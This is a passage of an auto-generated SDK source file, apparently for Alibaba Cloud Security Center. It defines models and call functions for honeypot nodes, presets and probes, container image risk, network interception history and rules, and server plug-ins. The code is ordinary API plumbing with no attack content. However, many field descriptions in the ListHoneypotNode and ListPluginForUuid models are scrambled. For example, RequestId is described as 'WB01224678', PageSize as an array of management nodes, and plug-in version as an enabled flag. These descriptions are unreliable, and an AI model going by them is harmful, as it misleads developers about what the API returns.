      nodeName?: string(name='NodeName', description='The ID of the Elastic Compute Service (ECS) instance.', example='cyct_cnymu'),
      probeTotalCount?: int32(name='ProbeTotalCount', description='The type of the management node. Default value: **false**. Valid values:

*   **false**: non-default type
*   **true**: default type', example='5'),
      probeUsedCount?: int32(name='ProbeUsedCount', description='Indicates whether the honeypot is allowed to access the Internet.

*   **true**: The honeypot is allowed to access the Internet.
*   **false**: The honeypot is not allowed to access the Internet.', example='2'),
      securityGroupProbeIpList?: [ string ](name='SecurityGroupProbeIpList', description='The status of the management node. Valid values:

*   **1**: normal
*   **2**: abnormal'),
      totalStatus?: int32(name='TotalStatus', description='The number of honeypots that are deployed on the management node.', example='1'),
      upgradeAvailable?: boolean(name='UpgradeAvailable', description='Whether the node is upgradable. Valid values:
*   **false**: non-default type
*   **true**: default type', example='true'),
    }
  ](name='HoneypotNodeList', description='The error message returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  message?: string(name='Message', description='ListHoneypotNode', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', description='The IP address of the management node.', example='2'),
    currentPage?: int32(name='CurrentPage', description='The number of entries to return on each page.', example='1'),
    pageSize?: int32(name='PageSize', description='An array that consists of the information about the management nodes.', example='20'),
    totalCount?: int32(name='TotalCount', description='The number of entries returned per page.', example='149'),
  }(name='PageInfo', description='An array that consists of the allowed CIDR blocks.'),
  requestId?: string(name='RequestId', description='WB01224678', example='337BEA70-B03D-5370-8420-436F3FCD9924'),
  success?: boolean(name='Success', description='The ID of the request, which is used to locate and troubleshoot issues.', example='true'),
}

model ListHoneypotNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotNodeResponseBody(name='body'),
}

async function listHoneypotNodeWithOptions(request: ListHoneypotNodeRequest, runtime: Util.RuntimeOptions): ListHoneypotNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotNode(request: ListHoneypotNodeRequest): ListHoneypotNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotNodeWithOptions(request, runtime);
}

model ListHoneypotPresetRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  honeypotImageName?: string(name='HoneypotImageName', example='ruoyi'),
  lang?: string(name='Lang', example='en'),
  nodeId?: string(name='NodeId', example='d892b4fe-af0d-4486-ab2a-8a518045****'),
  nodeName?: string(name='NodeName', example='Node1'),
  pageSize?: int32(name='PageSize', example='20'),
  presetName?: string(name='PresetName', example='mx-rouyi'),
}

model ListHoneypotPresetResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  list?: [ 
    {
      controlNodeName?: string(name='ControlNodeName', example='node1'),
      honeypotImageDisplayName?: string(name='HoneypotImageDisplayName', example='Metabase'),
      honeypotImageName?: string(name='HoneypotImageName', example='metabase'),
      honeypotPresetId?: string(name='HoneypotPresetId', example='3cc04a47-7229-418c-8101-f10a2887****'),
      nodeId?: string(name='NodeId', example='c94eff5b-ea48-4805-8b7f-e04d3509****'),
      presetName?: string(name='PresetName', example='WebMin-online'),
      presetType?: string(name='PresetType', example='CUSTOM'),
    }
  ](name='List'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='55'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='0C656B33-0D6B-5953-A26A-D766BD75B44A'),
  success?: boolean(name='Success', example='true'),
}

model ListHoneypotPresetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotPresetResponseBody(name='body'),
}

async function listHoneypotPresetWithOptions(request: ListHoneypotPresetRequest, runtime: Util.RuntimeOptions): ListHoneypotPresetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.honeypotImageName)) {
    query['HoneypotImageName'] = request.honeypotImageName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.nodeId)) {
    query['NodeId'] = request.nodeId;
  }
  if (!Util.isUnset(request.nodeName)) {
    query['NodeName'] = request.nodeName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.presetName)) {
    query['PresetName'] = request.presetName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotPreset',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotPreset(request: ListHoneypotPresetRequest): ListHoneypotPresetResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotPresetWithOptions(request, runtime);
}

model ListHoneypotProbeRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  displayName?: string(name='DisplayName', example='probe-test'),
  lang?: string(name='Lang', example='en'),
  pageSize?: int32(name='PageSize', example='20'),
  probeStatus?: string(name='ProbeStatus', example='online'),
  probeType?: string(name='ProbeType', example='host_probe'),
}

model ListHoneypotProbeResponseBody = {
  code?: string(name='Code', example='200'),
  httpStatusCode?: int32(name='HttpStatusCode', example='200'),
  list?: [ 
    {
      controlNode?: {
        ecsInstanceId?: string(name='EcsInstanceId', example='i-uf6eq0rlvu1mkh0p****'),
        nodeId?: string(name='NodeId', example='8ec9da17-c0e7-4642-aad6-defc9722****'),
        nodeName?: string(name='NodeName', example='HoneypotNode1'),
      }(name='ControlNode'),
      deployTime?: long(name='DeployTime', example='1669363825000'),
      displayName?: string(name='DisplayName', example='prod-pinpoint-hd1b'),
      hostIp?: string(name='HostIp', example='33.53.XX.XX'),
      osType?: string(name='OsType', example='windows'),
      probeId?: string(name='ProbeId', example='4d167bb3-dd09-4a6a-a179-d5d6a5b0****'),
      probeType?: string(name='ProbeType', example='host_probe'),
      probeVersion?: string(name='ProbeVersion', example='18060096'),
      status?: string(name='Status', example='online'),
      uuid?: string(name='Uuid', example='49e25e0f-bb51-4a5a-a1b3-13a4ddaa****'),
      vpcId?: string(name='VpcId', example='vpc-5gu8iu68w9b472jbb****'),
    }
  ](name='List'),
  message?: string(name='Message', example='successful'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='30'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='4BC9E610-21BE-537F-82EF-144A60D5A970'),
  success?: boolean(name='Success', example='true'),
}

model ListHoneypotProbeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListHoneypotProbeResponseBody(name='body'),
}

async function listHoneypotProbeWithOptions(request: ListHoneypotProbeRequest, runtime: Util.RuntimeOptions): ListHoneypotProbeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.displayName)) {
    query['DisplayName'] = request.displayName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.probeStatus)) {
    query['ProbeStatus'] = request.probeStatus;
  }
  if (!Util.isUnset(request.probeType)) {
    query['ProbeType'] = request.probeType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListHoneypotProbe',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listHoneypotProbe(request: ListHoneypotProbeRequest): ListHoneypotProbeResponse {
  var runtime = new Util.RuntimeOptions{};
  return listHoneypotProbeWithOptions(request, runtime);
}

model ListImageRegistryRegionResponseBody = {
  regions?: [ 
    {
      regionId?: string(name='RegionId', description='The region ID of the image.', example='cn-hangzhou'),
      regionName?: string(name='RegionName', description='The name of the region.', example='cn-hangzhou'),
    }
  ](name='Regions', description='An array that consists of regions.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='291B49F9-1685-4005-9D34-606B6F78****'),
}

model ListImageRegistryRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRegistryRegionResponseBody(name='body'),
}

async function listImageRegistryRegionWithOptions(runtime: Util.RuntimeOptions): ListImageRegistryRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'ListImageRegistryRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listImageRegistryRegion(): ListImageRegistryRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRegistryRegionWithOptions(runtime);
}

model ListImageRiskRequest {
  appName?: string(name='AppName', example='e****'),
  clusterId?: string(name='ClusterId', example='c80f79959fd724a888e1187779b13****'),
  currentPage?: int32(name='CurrentPage', example='1'),
  imageName?: string(name='ImageName', example='container-***:****'),
  namespace?: string(name='Namespace', example='kube-sy****'),
  pageSize?: int32(name='PageSize', example='20'),
}

model ListImageRiskResponseBody = {
  imageRiskList?: [ 
    {
      digest?: string(name='Digest', example='3f8efc2184cf1d24936b49c27286a284714b77be34c80c9ee38ca6bf322445****'),
      endPointList?: [ 
        {
          domains?: [ string ](name='Domains'),
          type?: string(name='Type', example='internet'),
        }
      ](name='EndPointList'),
      endpoints?: string(name='Endpoints', example='https://172.20.XXX.XXX/test'),
      image?: string(name='Image', example='.aliyuncs.com/sas_test/baseline:exploit'),
      imageAccessType?: string(name='ImageAccessType', example='IN_SAS'),
      imageId?: string(name='ImageId', example='f922bfeb6960436fe3f0e7b62fc6b9a0b47980986669c367c22433269404****'),
      internetURLs?: string(name='InternetURLs', example='****registry-registry.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
      regionId?: string(name='RegionId', example='cn-hangzhou'),
      registryType?: string(name='RegistryType', example='harbor'),
      repoId?: string(name='RepoId', example='crr-bk2l746eyxca1****'),
      repoName?: string(name='RepoName', example='scan_test'),
      repoNamespace?: string(name='RepoNamespace', example='vultar***'),
      repoType?: string(name='RepoType', example='PRIVATE'),
      statistics?: string(name='Statistics', example='{
	"baselineNum": 0,
	"newSuspicious": 0,
	"vul": 0
}'),
      tag?: string(name='Tag', example='0.1.0'),
      tagImmutable?: int32(name='TagImmutable', example='0'),
      uuid?: string(name='Uuid', example='624778f3-5bf2-423c-ac0c-47a62c05****'),
      vpcURLs?: string(name='VpcURLs', example='****-registry-registry-vpc.cn-shenzhen-finance-1.cr.aliyuncs.com/xxxx/docker-****'),
    }
  ](name='ImageRiskList'),
  pageInfo?: {
    count?: int32(name='Count', example='3'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='23'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='050ACC7A-D4FD-55C6-B861-BA9569C1****'),
}

model ListImageRiskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListImageRiskResponseBody(name='body'),
}

async function listImageRiskWithOptions(request: ListImageRiskRequest, runtime: Util.RuntimeOptions): ListImageRiskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageName)) {
    query['ImageName'] = request.imageName;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListImageRisk',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listImageRisk(request: ListImageRiskRequest): ListImageRiskResponse {
  var runtime = new Util.RuntimeOptions{};
  return listImageRiskWithOptions(request, runtime);
}

model ListInstanceCatalogRequest {
  lang?: string(name='Lang', example='zh'),
  regionId?: string(name='RegionId', example='cn-hangzhou'),
  requirementIds?: [ long ](name='RequirementIds'),
  standardIds?: [ long ](name='StandardIds'),
  types?: [ string ](name='Types'),
}

model ListInstanceCatalogResponseBody = {
  requestId?: string(name='RequestId', example='0D42A83F-CE33-5F54-A5AE-05DA39F59E1B'),
  vendors?: [ 
    {
      instanceTypes?: [ 
        {
          instanceSubTypes?: [ 
            {
              name?: string(name='Name', example='SECURITY_GROUP'),
            }
          ](name='InstanceSubTypes'),
          name?: string(name='Name', example='ECS'),
        }
      ](name='InstanceTypes'),
      name?: string(name='Name', example='ALIYUN'),
    }
  ](name='Vendors'),
}

model ListInstanceCatalogResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInstanceCatalogResponseBody(name='body'),
}

async function listInstanceCatalogWithOptions(request: ListInstanceCatalogRequest, runtime: Util.RuntimeOptions): ListInstanceCatalogResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.regionId)) {
    query['RegionId'] = request.regionId;
  }
  if (!Util.isUnset(request.requirementIds)) {
    query['RequirementIds'] = request.requirementIds;
  }
  if (!Util.isUnset(request.standardIds)) {
    query['StandardIds'] = request.standardIds;
  }
  if (!Util.isUnset(request.types)) {
    query['Types'] = request.types;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInstanceCatalog',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInstanceCatalog(request: ListInstanceCatalogRequest): ListInstanceCatalogResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInstanceCatalogWithOptions(request, runtime);
}

model ListInterceptionHistoryRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c7c190a82d9a048be9038d352840f****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  endTime?: long(name='EndTime', description='The end of the time range to query. The value is a UNIX timestamp.', example='1635575219000'),
  historyName?: string(name='HistoryName', description='The name of the alert.', example='Abnormal access'),
  interceptionTypes?: [ int32 ](name='InterceptionTypes', description='The types of exceptions.'),
  lang?: string(name='Lang', description='设置请求和接收消息的语言类型。默认值**zh**。取值：


- **zh**：中文
- **en**：英文', example='zh'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.', example='20'),
  startTime?: long(name='StartTime', description='The start of the time range to query. The value is a UNIX timestamp.', example='1651290987000'),
}

model ListInterceptionHistoryResponseBody = {
  interceptionHistoryList?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the container cluster.', example='c556c8133b5ad4378b7fc533ddbda****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='opa-terway-nonet****'),
      dstAppName?: string(name='DstAppName', description='The name of the destination application.', example='sas-web****'),
      dstNamespace?: string(name='DstNamespace', description='The destination namespace.', example='service****'),
      dstPort?: long(name='DstPort', description='The destination port range configured for the defense rule.', example='33'),
      dstRuleTargetName?: string(name='DstRuleTargetName', description='The name of the destination network object.', example='sas-web****'),
      firstTime?: long(name='FirstTime', description='The timestamp when the alert was first generated on the current day.', example='1639718858000'),
      id?: long(name='Id', description='The ID of the alert.', example='1126'),
      interceptionName?: long(name='InterceptionName', description='The name of the alert.', example='Abnormal access'),
      interceptionType?: int32(name='InterceptionType', description='The handling type. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      lastTime?: long(name='LastTime', description='The timestamp when the alert was last generated on the current day.', example='1639731078000'),
      realDstAppName?: string(name='RealDstAppName', description='The name of the destination application.', example='sas-service****'),
      realDstImageName?: string(name='RealDstImageName', description='The name of the destination image.', example='sas-servi****'),
      realDstNamespace?: string(name='RealDstNamespace', description='The destination namespace.', example='service****'),
      realDstPodName?: string(name='RealDstPodName', description='The destination pod.', example='sas-web-84cc7dd9****'),
      realInterceptionType?: int32(name='RealInterceptionType', description='The handling type of actual hits. Valid values:

*   **0**: monitor
*   **1**: intercept
*   **2**: generate alert
*   **3**: allow', example='0'),
      realSrcAppName?: string(name='RealSrcAppName', description='The name of the source application.', example='sas-service****'),
      realSrcImageName?: string(name='RealSrcImageName', description='The name of the source image.', example='sas-servi****'),
      realSrcNamespace?: string(name='RealSrcNamespace', description='The source namespace.', example='service****'),
      realSrcPodName?: string(name='RealSrcPodName', description='The source pod.', example='sas-service-757b9d****'),
      riskLevel?: long(name='RiskLevel', description='The risk level. Valid values:

*   **-1**: unknown
*   **0**: none
*   **1**: low
*   **2**: medium
*   **3**: high', example='1'),
      ruleId?: long(name='RuleId', description='The ID of the defense rule based on which the alert was generated.', example='136'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='all****'),
      srcAppName?: string(name='SrcAppName', description='The name of the source application.', example='sas-web****'),
      srcNamespace?: string(name='SrcNamespace', description='The source namespace.', example='service****'),
      srcRuleTargetName?: string(name='SrcRuleTargetName', description='The name of the source network object.', example='sas-web****'),
      status?: long(name='Status', description='The handling status. Valid values:

*   **0**: unhandled
*   **1**: handled
*   **2**: manually handled
*   **3**: ignored', example='1'),
      tryCount?: int32(name='TryCount', description='The number of attempts.', example='34'),
    }
  ](name='InterceptionHistoryList', description='An array that consists of the alerts generated by defense rules.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='45'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='D81DD78E-E006-5C65-A171-C8CB0904****'),
}

model ListInterceptionHistoryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionHistoryResponseBody(name='body'),
}

async function listInterceptionHistoryWithOptions(request: ListInterceptionHistoryRequest, runtime: Util.RuntimeOptions): ListInterceptionHistoryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.historyName)) {
    query['HistoryName'] = request.historyName;
  }
  if (!Util.isUnset(request.interceptionTypes)) {
    query['InterceptionTypes'] = request.interceptionTypes;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionHistory',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionHistory(request: ListInterceptionHistoryRequest): ListInterceptionHistoryResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionHistoryWithOptions(request, runtime);
}

model ListInterceptionRulePageRequest {
  clusterId?: string(name='ClusterId', example='cc41de13ab5474210bc0ce772a009****'),
  criteria?: string(name='Criteria', example='80'),
  criteriaType?: string(name='CriteriaType', example='DST_PORT'),
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='50'),
}

model ListInterceptionRulePageResponseBody = {
  interceptionRuleList?: [ 
    {
      dstTarget?: {
        appName?: string(name='AppName', example='console'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace', example='test'),
        ports?: [ string ](name='Ports'),
        ruleType?: string(name='RuleType', example='customize'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId', example='302001'),
        targetName?: string(name='TargetName', example='demo4****'),
        targetType?: string(name='TargetType', example='IMAGE'),
      }(name='DstTarget'),
      interceptType?: long(name='InterceptType', example='1'),
      orderIndex?: long(name='OrderIndex', example='1'),
      ruleId?: long(name='RuleId', example='30****'),
      ruleName?: string(name='RuleName', example='test'),
      ruleSwitch?: int32(name='RuleSwitch', example='1'),
      ruleType?: string(name='RuleType', example='customize'),
      srcTarget?: {
        appName?: string(name='AppName', example='ack-jenkins-lawr****'),
        imageList?: [ string ](name='ImageList'),
        namespace?: string(name='Namespace', example='jenkins'),
        ruleType?: string(name='RuleType', example='customize'),
        tagList?: [ string ](name='TagList'),
        targetId?: int32(name='TargetId', example='40****'),
        targetName?: string(name='TargetName', example='mhh-te****'),
        targetType?: string(name='TargetType', example='containerId'),
      }(name='SrcTarget'),
    }
  ](name='InterceptionRuleList'),
  pageInfo?: {
    count?: int32(name='Count', example='20'),
    currentPage?: int32(name='CurrentPage', example='19'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='2'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='ACF97412-FD09-4D1F-994F-34DF12BR****'),
}

model ListInterceptionRulePageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionRulePageResponseBody(name='body'),
}

async function listInterceptionRulePageWithOptions(request: ListInterceptionRulePageRequest, runtime: Util.RuntimeOptions): ListInterceptionRulePageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionRulePage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionRulePage(request: ListInterceptionRulePageRequest): ListInterceptionRulePageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionRulePageWithOptions(request, runtime);
}

model ListInterceptionTargetPageRequest {
  appName?: string(name='AppName', example='frontend'),
  currentPage?: int32(name='CurrentPage', example='1'),
  imageList?: [ string ](name='ImageList'),
  namespace?: string(name='Namespace', example='default'),
  pageSize?: int32(name='PageSize', example='20'),
  tagList?: [ string ](name='TagList'),
  targetName?: string(name='TargetName', example='source-test-obj-0****'),
  targetType?: string(name='TargetType', example='IMAGE'),
}

model ListInterceptionTargetPageResponseBody = {
  pageInfo?: {
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='45'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='028CF634-5268-5660-9575-48C9ED6B****'),
  ruleTargetList?: [ 
    {
      appName?: string(name='AppName', example='frontend'),
      clusterId?: string(name='ClusterId', example='c3e2eae03eb064d2ebf940cd5e1b17****'),
      clusterName?: string(name='ClusterName', example='sas-test-cnnf'),
      imageList?: [ string ](name='ImageList'),
      namespace?: string(name='Namespace', example='default'),
      ruleType?: string(name='RuleType', example='customize'),
      tagList?: [ string ](name='TagList'),
      targetId?: long(name='TargetId', example='400914'),
      targetName?: string(name='TargetName', example='destination-test-obj-Na3cF'),
      targetType?: string(name='TargetType', example='IMAGE'),
    }
  ](name='RuleTargetList'),
}

model ListInterceptionTargetPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListInterceptionTargetPageResponseBody(name='body'),
}

async function listInterceptionTargetPageWithOptions(request: ListInterceptionTargetPageRequest, runtime: Util.RuntimeOptions): ListInterceptionTargetPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.appName)) {
    query['AppName'] = request.appName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageList)) {
    query['ImageList'] = request.imageList;
  }
  if (!Util.isUnset(request.namespace)) {
    query['Namespace'] = request.namespace;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.tagList)) {
    query['TagList'] = request.tagList;
  }
  if (!Util.isUnset(request.targetName)) {
    query['TargetName'] = request.targetName;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ListInterceptionTargetPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function listInterceptionTargetPage(request: ListInterceptionTargetPageRequest): ListInterceptionTargetPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return listInterceptionTargetPageWithOptions(request, runtime);
}

model ListPluginForUuidRequest {
  types?: [ string ](name='Types', description='An array that consists of the information about the plug-ins.'),
  uuid?: string(name='Uuid', description='The configurations of the plug-in.', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidShrinkRequest {
  typesShrink?: string(name='Types', description='An array that consists of the information about the plug-ins.'),
  uuid?: string(name='Uuid', description='The configurations of the plug-in.', example='bdb7071f-129d-4ceb-af80-4cf70c4571c6'),
}

model ListPluginForUuidResponseBody = {
  aegisUuidTargetPluginConfigList?: [ 
    {
      aegisSuspiciousConfigList?: [ 
        {
          config?: boolean(name='Config', description='The name of the plug-in. Valid values:

*   **alihips**: trojan-specific prevention
*   **alisecguard**: attack-specific prevention
*   **alinet**: defense against attacks on servers', example='true'),
          msg?: string(name='Msg', description='Queries the information about plug-ins on a server.', example='authorized'),
          overallConfig?: boolean(name='OverallConfig', description='ListPluginForUuid', example='true'),
          type?: string(name='Type', description='The ID of the request, which is used to locate and troubleshoot issues.', example='alisecguard'),
        }
      ](name='AegisSuspiciousConfigList', description='The information about the plug-in.'),
      pluginInstallCode?: string(name='PluginInstallCode', description='The installation code of the plug-in.', example='k5O5nd'),
      pluginName?: string(name='PluginName', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='alisecguard'),
      pluginOnlineInstalled?: boolean(name='PluginOnlineInstalled', description='The version of the plug-in.', example='true'),
      pluginOnlineStatus?: boolean(name='PluginOnlineStatus', description='An array that consists of the configurations of plug-ins.', example='true'),
      pluginVersion?: string(name='PluginVersion', description='Indicates whether the plug-in is enabled. Valid values:

*   **true**: yes
*   **false**: no', example='00_10'),
    }
  ](name='AegisUuidTargetPluginConfigList', description='The type of the plug-in. Valid values:

*   **auto_breaking**: antivirus
*   **ransomware_breaking**: anti-ransomware (bait capture)
*   **webshell_cloud_breaking**: webshell prevention
*   **alisecguard**: client protection
*   **alinet**: malicious behavior defense'),
  code?: int32(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model ListPluginForUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ListPluginForUuidResponseBody(name='body'),
}

